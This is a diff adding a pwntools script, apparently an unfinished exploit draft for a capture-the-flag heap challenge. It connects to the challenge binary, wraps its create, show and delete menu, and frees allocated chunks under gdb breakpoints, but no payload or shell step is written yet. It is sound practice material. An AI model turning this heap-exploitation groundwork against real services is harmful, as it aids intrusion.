@@ -1,0 +1,74 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("chal_patched")
+libc = ELF("libc.so.6")
+ld = ELF("ld-linux-x86-64.so.2")
+
+context.binary = exe
+
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        if args.DEBUG:
+            gdb.attach(r)
+    else:
+        r = remote("addr", 1337)
+
+    return r
+
+r = conn()
+
+sa   = lambda a,b : r.sendafter(a,b)
+sla  = lambda a,b : r.sendlineafter(a,b)
+sd   = lambda a,b : r.send(a,b)
+sl   = lambda a,b : r.sendline(a,b)
+ru   = lambda a : r.recvuntil(a, drop=True)
+rc   = lambda : r.recv(4096)
+uu32 = lambda data : u32(data.ljust(4, b'\0'))
+uu64 = lambda data : u64(data.ljust(8, b'\0'))
+
+def start_(size, hax0r=False):
+    sla(b'>', hex(size).encode())
+    if hax0r:
+        sla(b'>', '1')
+    else:
+        sla(b'>', '2')
+
+def create(index, size, content):
+    sla(b'>', '1')
+    sla(b'>', index)
+    sla(b'>', f'{size}'.encode())
+    sla(b'>', content)
+
+def show(index):
+    sla(b'>', '2')
+    sla(b'>', index)
+
+def delete(index):
+    sla(b'>', '3')
+    sla(b'>', index)
+
+def exit():
+    sla(b'>', '4')
+
+def main():
+    start_(0x5000)
+    gdb.attach(r, gdbscript="b not_malloc\nb not_free")
+
+    create('0', 0x20, 'A'*8)
+    create('1', 0x400, 'B'*0x20)
+    create('2', 0x20, 'C'*0x8)
+
+    delete('2')
+    delete('1')
+    delete('0')
+
+
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
